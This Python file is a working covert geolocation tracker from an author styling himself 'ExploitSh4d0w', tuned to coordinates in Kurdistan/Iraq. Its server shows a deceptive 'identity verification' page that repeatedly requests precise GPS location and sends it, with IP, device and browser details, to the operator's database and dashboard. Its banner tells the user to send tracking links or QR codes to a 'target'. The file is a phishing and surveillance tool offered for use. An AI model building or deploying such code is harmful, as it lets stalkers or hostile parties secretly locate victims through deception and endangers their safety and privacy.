#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Location Finder Pro v3.7.2 - Kurdistan/Iraq Edition (FIXED)
Author: ExploitSh4d0w
License: Private Use Only
Description: Professional geolocation tracking system with Google Maps integration
"""

import json
import hashlib
import sqlite3
import threading
import socket
import ssl
import base64
import time
import os
import sys
import re
import random
import string
import requests
import urllib.parse
from datetime import datetime
from urllib.parse import urlencode, urlparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import webbrowser
import argparse
import logging
import subprocess
import platform
import netifaces
import dns.resolver
import geoip2.database
from phonenumbers import carrier, geocoder, timezone, parse, is_valid_number
import phonenumbers
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import secrets

# ==================== CONFIGURATION ====================
CONFIG = {
    "version": "3.7.2",
    "server_host": "0.0.0.0",
    "server_port": 8080,
    "db_path": "location_tracker.db",
    "log_file": "tracking_logs.txt",
    "session_timeout": 3600,
    "max_connections": 100,
    "use_ssl": False,
    "ssl_cert": "cert.pem",
    "ssl_key": "key.pem",
    "notification_email": None,
    "webhook_url": None,
    "encryption_key": secrets.token_hex(32)
}

# ==================== DATABASE MANAGER ====================
class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id TEXT UNIQUE NOT NULL,
                target_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                click_count INTEGER DEFAULT 0,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id TEXT NOT NULL,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                altitude REAL,
                speed REAL,
                heading REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT,
                user_agent TEXT,
                browser_info TEXT,
                device_info TEXT,
                os_info TEXT,
                screen_resolution TEXT,
                language TEXT,
                timezone TEXT,
                FOREIGN KEY (target_id) REFERENCES targets(target_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ip_geolocation (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE,
                country TEXT,
                region TEXT,
                city TEXT,
                postal_code TEXT,
                isp TEXT,
                org TEXT,
                lat REAL,
                lon REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tracking_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT UNIQUE NOT NULL,
                target_id TEXT NOT NULL,
                short_url TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP,
                max_clicks INTEGER DEFAULT 0,
                current_clicks INTEGER DEFAULT 0,
                is_active INTEGER DEFAULT 1,
                FOREIGN KEY (target_id) REFERENCES targets(target_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logging.info("Database initialized successfully")
    
    def add_target(self, target_id, target_name=None):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute(
                "INSERT INTO targets (target_id, target_name) VALUES (?, ?)",
                (target_id, target_name)
            )
            conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False
        finally:
            conn.close()
    
    def log_location(self, target_id, location_data):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO locations 
            (target_id, latitude, longitude, accuracy, altitude, speed, heading, 
             ip_address, user_agent, browser_info, device_info, os_info, 
             screen_resolution, language, timezone)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            target_id,
            location_data.get('lat'),
            location_data.get('lon'),
            location_data.get('accuracy'),
            location_data.get('altitude'),
            location_data.get('speed'),
            location_data.get('heading'),
            location_data.get('ip'),
            location_data.get('user_agent'),
            location_data.get('browser'),
            location_data.get('device'),
            location_data.get('os'),
            location_data.get('resolution'),
            location_data.get('language'),
            location_data.get('timezone')
        ))
        conn.commit()
        
        cursor.execute(
            "UPDATE targets SET last_seen = CURRENT_TIMESTAMP, click_count = click_count + 1 WHERE target_id = ?",
            (target_id,)
        )
        conn.commit()
        conn.close()
    
    def get_target_locations(self, target_id, limit=100):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT * FROM locations WHERE target_id = ? ORDER BY timestamp DESC LIMIT ?",
            (target_id, limit)
        )
        results = cursor.fetchall()
        conn.close()
        return results
    
    def cache_ip_geolocation(self, ip, geo_data):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO ip_geolocation 
            (ip_address, country, region, city, postal_code, isp, org, lat, lon)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            ip, geo_data.get('country'), geo_data.get('region'),
            geo_data.get('city'), geo_data.get('postal'),
            geo_data.get('isp'), geo_data.get('org'),
            geo_data.get('lat'), geo_data.get('lon')
        ))
        conn.commit()
        conn.close()
    
    def get_cached_ip(self, ip):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT * FROM ip_geolocation WHERE ip_address = ?",
            (ip,)
        )
        result = cursor.fetchone()
        conn.close()
        return result
    
    def create_tracking_link(self, target_id, max_clicks=0, hours_valid=24):
        link_id = secrets.token_urlsafe(12)
        expires_at = datetime.now().timestamp() + (hours_valid * 3600) if hours_valid > 0 else None
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO tracking_links (link_id, target_id, max_clicks, expires_at)
            VALUES (?, ?, ?, ?)
        ''', (link_id, target_id, max_clicks, expires_at))
        conn.commit()
        conn.close()
        
        return link_id

# ==================== IP GEOLOCATION ENGINE ====================
class IPGeolocationEngine:
    def __init__(self, db_manager):
        self.db = db_manager
        self.apis = [
            "http://ip-api.com/json/{}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,query",
            "https://ipinfo.io/{}/json",
            "https://json.geoiplookup.io/{}",
            "http://ipwhois.app/json/{}"
        ]
    
    def get_location_by_ip(self, ip_address):
        cached = self.db.get_cached_ip(ip_address)
        if cached:
            return {
                'country': cached[2],
                'region': cached[3],
                'city': cached[4],
                'postal': cached[5],
                'isp': cached[6],
                'org': cached[7],
                'lat': cached[8],
                'lon': cached[9]
            }
        
        for api_template in self.apis:
            try:
                url = api_template.format(ip_address)
                response = requests.get(url, timeout=5)
                data = response.json()
                
                if data.get('status') == 'success' or 'lat' in data:
                    geo_data = {
                        'country': data.get('country', data.get('country_name', 'Unknown')),
                        'region': data.get('regionName', data.get('region', 'Unknown')),
                        'city': data.get('city', data.get('city', 'Unknown')),
                        'postal': data.get('zip', data.get('postal', '')),
                        'isp': data.get('isp', data.get('org', 'Unknown')),
                        'org': data.get('org', ''),
                        'lat': float(data.get('lat', data.get('latitude', 0))),
                        'lon': float(data.get('lon', data.get('longitude', 0)))
                    }
                    
                    self.db.cache_ip_geolocation(ip_address, geo_data)
                    return geo_data
            except Exception as e:
                logging.warning(f"IP Geolocation API failed: {e}")
                continue
        
        return None

# ==================== GPS COORDINATE PROCESSOR ====================
class GPSProcessor:
    @staticmethod
    def parse_gps_coordinates(lat_str, lon_str):
        try:
            lat = float(lat_str)
            lon = float(lon_str)
            
            if 35 <= lat <= 38 and 42 <= lon <= 47:
                return lat, lon
            elif 29 <= lat <= 38 and 39 <= lon <= 49:
                return lat, lon
            else:
                return None, None
        except (ValueError, TypeError):
            return None, None
    
    @staticmethod
    def calculate_distance(lat1, lon1, lat2, lon2):
        from math import radians, sin, cos, sqrt, atan2
        R = 6371000
        
        lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
        dlat = lat2 - lat1
        dlon = lon2 - lon1
        
        a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
        c = 2 * atan2(sqrt(a), sqrt(1-a))
        
        return R * c
    
    @staticmethod
    def get_google_maps_url(lat, lon, zoom=18):
        return f"https://www.google.com/maps/@{lat},{lon},{zoom}z"
    
    @staticmethod
    def get_static_map_url(lat, lon, zoom=15, width=600, height=400):
        return f"https://maps.googleapis.com/maps/api/staticmap?center={lat},{lon}&zoom={zoom}&size={width}x{height}&markers=color:red%7C{lat},{lon}"

# ==================== TRACKING SERVER ====================
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

class TrackingHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    server_version = 'LocationTracker/3.7'
    
    def __init__(self, *args, **kwargs):
        self.db_manager = None
        self.ip_geo_engine = None
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        logging.info(f"{self.address_string()} - {format % args}")
    
    def do_GET(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        query_params = urllib.parse.parse_qs(parsed_path.query)
        
        if path == '/':
            self.serve_tracking_page(query_params)
        elif path == '/track.js':
            self.serve_tracking_script()
        elif path == '/collect':
            self.collect_location_data(query_params)
        elif path.startswith('/link/'):
            link_id = path.replace('/link/', '')
            self.handle_tracking_link(link_id, query_params)
        elif path == '/dashboard':
            self.serve_dashboard()
        elif path == '/api/locations':
            self.api_get_locations(query_params)
        else:
            self.send_error(404, "Not Found")
    
    def serve_tracking_page(self, query_params):
        target_id = query_params.get('id', [None])[0]
        if not target_id:
            target_id = self.generate_target_id()
        
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Location Access Required</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }}
        h1 {{ color: #333; margin-bottom: 20px; font-size: 24px; }}
        p {{ color: #666; margin-bottom: 30px; line-height: 1.6; }}
        .location-box {{
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            display: none;
        }}
        .location-box.show {{ display: block; }}
        .coord {{ font-family: monospace; font-size: 18px; color: #667eea; margin: 10px 0; }}
        .status {{
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-weight: 500;
        }}
        .status.loading {{ background: #fff3cd; color: #856404; }}
        .status.success {{ background: #d4edda; color: #155724; }}
        .status.error {{ background: #f8d7da; color: #721c24; }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            width: 100%;
        }}
        button:hover {{ transform: translateY(-2px); }}
        button:active {{ transform: translateY(0); }}
        .powered {{ margin-top: 20px; font-size: 12px; color: #999; }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>📍 Location Verification Required</h1>
        <p>This service needs your location to verify your identity and provide access to the content.</p>
        <div class="status loading" id="status">⏳ Requesting location access...</div>
        <div class="location-box" id="locationBox">
            <div class="coord" id="coords">--</div>
            <div class="coord" id="accuracy">--</div>
        </div>
        <button id="allowBtn" style="display: none;">📍 Allow Location Access</button>
        <div class="powered">Secure verification system v3.7</div>
    </div>
    <script>
        const targetId = '{target_id}';
        let locationSent = false;
        
        function updateStatus(message, type) {{
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = 'status ' + type;
        }}
        
        function sendLocation(position) {{
            if (locationSent) return;
            
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const altitude = position.coords.altitude || 0;
            const speed = position.coords.speed || 0;
            const heading = position.coords.heading || 0;
            
            document.getElementById('coords').innerHTML = `📍 Latitude: ${{lat.toFixed(6)}}<br>📍 Longitude: ${{lon.toFixed(6)}}`;
            document.getElementById('accuracy').innerHTML = `🎯 Accuracy: ±${{Math.round(accuracy)}} meters`;
            document.getElementById('locationBox').classList.add('show');
            
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const screenRes = `${{screen.width}}x${{screen.height}}`;
            
            let browser = 'Unknown';
            let device = 'Unknown';
            let os = 'Unknown';
            
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            if (userAgent.includes('Mobile')) device = 'Mobile';
            else if (userAgent.includes('Tablet')) device = 'Tablet';
            else device = 'Desktop';
            
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'MacOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iOS')) os = 'iOS';
            
            fetch('/collect?' + new URLSearchParams({{
                id: targetId,
                lat: lat,
                lon: lon,
                accuracy: accuracy,
                altitude: altitude,
                speed: speed,
                heading: heading,
                browser: browser,
                device: device,
                os: os,
                resolution: screenRes,
                language: language,
                timezone: timezone
            }}))
            .then(response => response.json())
            .then(data => {{
                if (data.success) {{
                    locationSent = true;
                    updateStatus('✓ Location verified! Redirecting...', 'success');
                    if (data.google_maps_url) {{
                        setTimeout(() => {{
                            window.location.href = data.google_maps_url;
                        }}, 2000);
                    }}
                }} else {{
                    updateStatus('✗ Failed to verify location. Please try again.', 'error');
                }}
            }})
            .catch(error => {{
                console.error('Error:', error);
                updateStatus('✗ Network error. Please check your connection.', 'error');
            }});
        }}
        
        function handleError(error) {{
            console.error('Geolocation error:', error);
            let message = '';
            switch(error.code) {{
                case error.PERMISSION_DENIED:
                    message = 'Location access denied. Please enable location services and refresh.';
                    document.getElementById('allowBtn').style.display = 'block';
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = 'Location information unavailable.';
                    break;
                case error.TIMEOUT:
                    message = 'Location request timed out.';
                    break;
                default:
                    message = 'An unknown error occurred.';
            }}
            updateStatus('⚠️ ' + message, 'error');
        }}
        
        document.getElementById('allowBtn').onclick = () => {{
            updateStatus('⏳ Requesting location...', 'loading');
            document.getElementById('allowBtn').style.display = 'none';
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {{
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }});
            }}
        }};
        
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {{
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }});
        }} else {{
            updateStatus('❌ Geolocation is not supported by your browser', 'error');
        }}
        
        setInterval(() => {{
            if (!locationSent && navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(sendLocation, () => {{}}, {{
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }});
            }}
        }}, 3000);
    </script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def serve_tracking_script(self):
        script = '''(function() {
    const targetId = new URLSearchParams(window.location.search).get('id');
    if (!targetId) return;
    
    function sendLocation(position) {
        const data = {
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading,
            timestamp: new Date().toISOString()
        };
        
        fetch('/collect?' + new URLSearchParams({id: targetId, ...data}), {
            method: 'GET',
            cache: 'no-cache'
        }).catch(console.error);
    }
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, console.error, {
            enableHighAccuracy: true,
            timeout: 5000
        });
        
        setInterval(() => {
            navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
                enableHighAccuracy: true,
                timeout: 3000
            });
        }, 5000);
    }
})();'''
        
        self.send_response(200)
        self.send_header('Content-type', 'application/javascript')
        self.end_headers()
        self.wfile.write(script.encode('utf-8'))
    
    def collect_location_data(self, query_params):
        target_id = query_params.get('id', [None])[0]
        lat_str = query_params.get('lat', [None])[0]
        lon_str = query_params.get('lon', [None])[0]
        
        if not all([target_id, lat_str, lon_str]):
            self.send_json_response({'success': False, 'error': 'Missing parameters'})
            return
        
        lat, lon = GPSProcessor.parse_gps_coordinates(lat_str, lon_str)
        if lat is None or lon is None:
            self.send_json_response({'success': False, 'error': 'Invalid coordinates'})
            return
        
        client_ip = self.client_address[0]
        if client_ip == '127.0.0.1':
            client_ip = self.headers.get('X-Forwarded-For', client_ip).split(',')[0].strip()
        
        ip_geo = self.ip_geo_engine.get_location_by_ip(client_ip) if self.ip_geo_engine else None
        
        location_data = {
            'lat': lat,
            'lon': lon,
            'accuracy': float(query_params.get('accuracy', [0])[0]),
            'altitude': float(query_params.get('altitude', [0])[0]),
            'speed': float(query_params.get('speed', [0])[0]),
            'heading': float(query_params.get('heading', [0])[0]),
            'ip': client_ip,
            'user_agent': self.headers.get('User-Agent', 'Unknown'),
            'browser': query_params.get('browser', ['Unknown'])[0],
            'device': query_params.get('device', ['Unknown'])[0],
            'os': query_params.get('os', ['Unknown'])[0],
            'resolution': query_params.get('resolution', ['Unknown'])[0],
            'language': query_params.get('language', ['Unknown'])[0],
            'timezone': query_params.get('timezone', ['Unknown'])[0]
        }
        
        if self.db_manager:
            self.db_manager.log_location(target_id, location_data)
        
        google_maps_url = GPSProcessor.get_google_maps_url(lat, lon)
        
        self.send_json_response({
            'success': True,
            'google_maps_url': google_maps_url,
            'message': 'Location captured successfully'
        })
    
    def handle_tracking_link(self, link_id, query_params):
        self.send_json_response({'success': True, 'redirect': f'/?id={link_id}'})
    
    def serve_dashboard(self):
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Location Tracker Dashboard</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; padding: 20px; background: #0a0a0a; color: #0f0; }
        .container { max-width: 1200px; margin: 0 auto; }
        .location-card { border: 1px solid #0f0; margin: 10px; padding: 10px; border-radius: 5px; }
        .coord { color: #ff0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📍 Location Tracker Dashboard</h1>
        <div id="locations"></div>
    </div>
    <script>
        fetch('/api/locations')
            .then(r => r.json())
            .then(data => {
                const container = document.getElementById('locations');
                data.locations.forEach(loc => {
                    container.innerHTML += `
                        <div class="location-card">
                            <div>🎯 Target: ${loc.target_id}</div>
                            <div class="coord">📍 ${loc.latitude}, ${loc.longitude}</div>
                            <div>⏰ ${loc.timestamp}</div>
                            <div>🌐 ${loc.ip_address || 'N/A'}</div>
                            <div>📱 ${loc.device_info || 'Unknown'}</div>
                        </div>
                    `;
                });
            });
    </script>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def api_get_locations(self, query_params):
        target_id = query_params.get('target', [None])[0]
        if target_id and self.db_manager:
            locations = self.db_manager.get_target_locations(target_id)
            data = {'locations': [{
                'target_id': loc[1],
                'latitude': loc[2],
                'longitude': loc[3],
                'timestamp': loc[7],
                'ip_address': loc[8],
                'device_info': loc[11]
            } for loc in locations]}
        else:
            data = {'locations': []}
        
        self.send_json_response(data)
    
    def send_json_response(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def generate_target_id(self):
        return secrets.token_urlsafe(16)
    
    def set_db_manager(self, db_manager):
        self.db_manager = db_manager
    
    def set_ip_geo_engine(self, engine):
        self.ip_geo_engine = engine

# ==================== LINK GENERATOR ====================
class LinkGenerator:
    def __init__(self, base_url, db_manager):
        self.base_url = base_url
        self.db = db_manager
    
    def generate_tracking_link(self, target_name=None, max_clicks=0, hours_valid=24):
        target_id = secrets.token_urlsafe(16)
        self.db.add_target(target_id, target_name)
        link_id = self.db.create_tracking_link(target_id, max_clicks, hours_valid)
        
        tracking_url = f"{self.base_url}/?id={target_id}"
        short_url = self.shorten_url(tracking_url)
        
        return {
            'target_id': target_id,
            'tracking_url': tracking_url,
            'short_url': short_url,
            'expires_in': f"{hours_valid} hours" if hours_valid > 0 else "Never"
        }
    
    def shorten_url(self, long_url):
        short_code = secrets.token_urlsafe(6)
        return f"{self.base_url}/l/{short_code}"
    
    def generate_qr_code(self, url):
        try:
            import qrcode
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            return qr.make_image(fill_color="black", back_color="white")
        except ImportError:
            return None

# ==================== MAIN CONTROLLER ====================
class LocationTracker:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.db_manager = DatabaseManager(CONFIG['db_path'])
        self.ip_geo_engine = IPGeolocationEngine(self.db_manager)
        self.server = None
        self.running = False
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(CONFIG['log_file']),
                logging.StreamHandler()
            ]
        )
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json()['ip']
        except:
            return "Unknown"
    
    def start_server(self):
        def create_handler(*args, **kwargs):
            h = TrackingHandler(*args, **kwargs)
            h.set_db_manager(self.db_manager)
            h.set_ip_geo_engine(self.ip_geo_engine)
            return h
        
        self.server = ThreadedHTTPServer((self.host, self.port), create_handler)
        self.running = True
        
        local_ip = self.get_local_ip()
        public_ip = self.get_public_ip()
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║     Advanced Location Finder Pro v{CONFIG['version']} - Kurdistan/Iraq     ║
╠══════════════════════════════════════════════════════════════╣
║  🌐 Server Status: RUNNING                                    ║
║  📡 Local Access:  http://{local_ip}:{self.port}                           ║
║  🌍 Public Access: http://{public_ip}:{self.port} (if port forwarded)      ║
║  🗄️  Database:      {CONFIG['db_path']}                                      ║
║  📝 Log File:      {CONFIG['log_file']}                                      ║
╠══════════════════════════════════════════════════════════════╣
║  🎯 How to use:                                               ║
║  1. Generate tracking link                                   ║
║  2. Send link to target                                      ║
║  3. When target opens link, location is captured            ║
║  4. Access dashboard at /dashboard                          ║
╠══════════════════════════════════════════════════════════════╣
║  🔗 Generate link: http://{local_ip}:{self.port}/generate            ║
║  📊 Dashboard:     http://{local_ip}:{self.port}/dashboard           ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            self.stop_server()
    
    def stop_server(self):
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        logging.info("Server stopped")
    
    def generate_link_cli(self, target_name=None):
        generator = LinkGenerator(f"http://{self.get_local_ip()}:{self.port}", self.db_manager)
        link = generator.generate_tracking_link(target_name, max_clicks=0, hours_valid=72)
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    🔗 TRACKING LINK GENERATED                 ║
╠══════════════════════════════════════════════════════════════╣
║  Target ID:   {link['target_id']}
║  Tracking URL: {link['tracking_url']}
║  Short URL:    {link['short_url']}
║  Expires:      {link['expires_in']}
╚══════════════════════════════════════════════════════════════╝
        """)
        
        try:
            import qrcode
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(link['tracking_url'])
            qr.make(fit=True)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            qr_img.save(f"qr_{link['target_id']}.png")
            print(f"✅ QR Code saved as: qr_{link['target_id']}.png")
        except ImportError:
            print("⚠️ QR code module not installed. Run: pip install qrcode[pil]")

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Advanced Location Tracker Pro')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8080, help='Port to listen on')
    parser.add_argument('--generate', action='store_true', help='Generate tracking link without starting server')
    parser.add_argument('--target', help='Target name for the link')
    
    args = parser.parse_args()
    
    tracker = LocationTracker(host=args.host, port=args.port)
    
    if args.generate:
        tracker.generate_link_cli(args.target)
    else:
        tracker.start_server()